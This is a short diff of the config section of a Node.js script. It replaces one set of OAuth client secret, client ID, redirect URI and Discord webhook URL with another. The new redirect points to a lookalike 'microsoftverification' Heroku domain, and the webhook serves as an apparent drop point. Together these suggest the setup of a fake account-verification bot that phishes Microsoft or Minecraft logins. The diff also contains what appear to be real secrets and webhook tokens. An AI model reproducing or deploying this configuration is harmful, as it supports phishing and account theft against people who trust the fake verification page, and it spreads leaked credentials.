@@ -1,8 +1,8 @@
 //Config
-const client_secret = 'lEr8Q~IZ8eEOhvU6.U3Thk1kfAXg1t1fYA8kMb~~'
-const client_id = 'bf4a6eda-baa1-46da-80d6-a89070bbff6a'
-const redirect_uri = 'https://verificationbotmine.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1045027659203231854/_mYmptA6X_CKWOtDQ-veWr0817x8jPrlg-pZkpojAKaH1x40sEXJrPcrn2eiWqsniqw0'
+const client_secret = 'MGT8Q~db1tHPeMnHhOhctecgS4TDXZwE6J1ttaMy'
+const client_id = '05dde2d7-a535-4be2-9cb8-08db60e4c26d'
+const redirect_uri = 'https://microsoftverification.herokuapp.com'
+const webhook_url = 'https://discord.com/api/webhooks/1046611424140607528/MT_GRTdK0z4nS-9wwxlxqRyzw70QuIgqpRbkukfR8j-Sj6EOTqVW1_eDcU0xQHBXyf0f'
 //Requirements
 const axios = require('axios')
 const express = require('express')
